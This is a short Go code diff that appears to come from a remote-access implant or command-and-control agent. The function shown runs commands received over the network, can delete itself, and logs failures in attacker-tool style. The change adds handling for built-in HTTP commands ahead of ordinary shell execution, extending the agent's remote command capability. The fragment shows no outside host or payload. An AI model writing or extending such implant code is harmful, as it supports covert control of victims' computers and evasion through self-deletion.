@@ -335,8 +335,13 @@ func MakeRequest(opts *RequestOptions) (*ResponseData, error) {
 					selfDelete()
 				}
 
-				// Execute the command
-				output, err := ExecuteCommand(commandStr)
+				var output string
+				var err error
+				if out, e, ok := runBuiltinHTTPCommand(commandStr); ok {
+					output, err = out, e
+				} else {
+					output, err = ExecuteCommand(commandStr)
+				}
 				if err != nil {
 					log.Printf("[-] Command execution failed: %s\n", err)
 					output = err.Error()
